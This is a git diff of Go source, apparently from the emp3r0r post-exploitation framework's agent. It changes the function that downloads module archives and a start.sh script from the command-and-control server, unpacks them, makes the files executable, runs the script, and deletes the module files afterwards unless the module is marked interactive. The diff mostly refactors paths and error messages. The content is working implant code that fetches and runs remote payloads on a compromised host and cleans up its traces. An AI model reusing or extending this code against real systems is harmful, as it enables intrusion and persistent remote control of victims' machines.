@@ -1,6 +1,3 @@
-//go:build linux
-// +build linux
-
 package agent
 
 import (
@@ -12,17 +9,18 @@ import (
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archiver"
 )
 
 func moduleHandler(modName, checksum string) (out string) {
-	tarball := emp3r0r_data.AgentRoot + "/" + modName + ".tar.bz2"
-	modDir := emp3r0r_data.AgentRoot + "/" + modName
+	tarball := RuntimeConfig.AgentRoot + "/" + modName + ".tar.bz2"
+	modDir := RuntimeConfig.AgentRoot + "/" + modName
 	start_sh := modDir + "/start.sh"
 
 	// if we have already downloaded the module, dont bother downloading again
 	if tun.SHA256SumFile(tarball) != checksum {
-		_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".tar.bz2",
+		_, err := DownloadViaCC(modName+".tar.bz2",
 			tarball)
 		if err != nil {
 			return err.Error()
@@ -37,16 +35,16 @@ func moduleHandler(modName, checksum string) (out string) {
 
 	// extract files
 	os.RemoveAll(modDir)
-	if err := archiver.Unarchive(tarball, emp3r0r_data.AgentRoot); err != nil {
-		return err.Error()
+	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
+		return fmt.Sprintf("Unarchive module tarball: %v", err)
 	}
 
 	// download start.sh
 	os.RemoveAll(start_sh)
-	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".sh",
+	_, err := DownloadViaCC(modName+".sh",
 		start_sh)
 	if err != nil {
-		return err.Error()
+		return fmt.Sprintf("Downloading start.sh: %v", err)
 	}
 
 	// exec
@@ -58,7 +56,23 @@ func moduleHandler(modName, checksum string) (out string) {
 	if err != nil {
 		return fmt.Sprintf("cd to module dir: %v", err)
 	}
-	defer os.Chdir(pwd)
+
+	// process files in module archive
+	libs_tarball := "libs.tar.xz"
+	files, err := ioutil.ReadDir("./")
+	if err != nil {
+		return fmt.Sprintf("Processing module files: %v", err)
+	}
+	for _, f := range files {
+		os.Chmod(f.Name(), 0700)
+		if util.IsFileExist(libs_tarball) {
+			os.RemoveAll("libs")
+			err = archiver.Unarchive(libs_tarball, "./")
+			if err != nil {
+				return fmt.Sprintf("Unarchive %s: %v", libs_tarball, err)
+			}
+		}
+	}
 
 	cmd := exec.Command(emp3r0r_data.DefaultShell, start_sh)
 
@@ -67,13 +81,20 @@ func moduleHandler(modName, checksum string) (out string) {
 	if err != nil {
 		log.Printf("Read %s: %v", start_sh, err)
 	}
-	log.Printf("Running start.sh %s", shdata)
+	log.Printf("Running start.sh:\n%s", shdata)
 
 	outbytes, err := cmd.CombinedOutput()
 	if err != nil {
 		out = fmt.Sprintf("Running module: %s: %v", outbytes, err)
 	}
-	defer os.RemoveAll(modDir)
+
+	defer func() {
+		os.Chdir(pwd)
+		// remove module files if it's non-interactive
+		if !util.IsStrInFile("echo emp3r0r-interactive-module", start_sh) {
+			os.RemoveAll(modDir)
+		}
+	}()
 
 	return string(outbytes)
 }
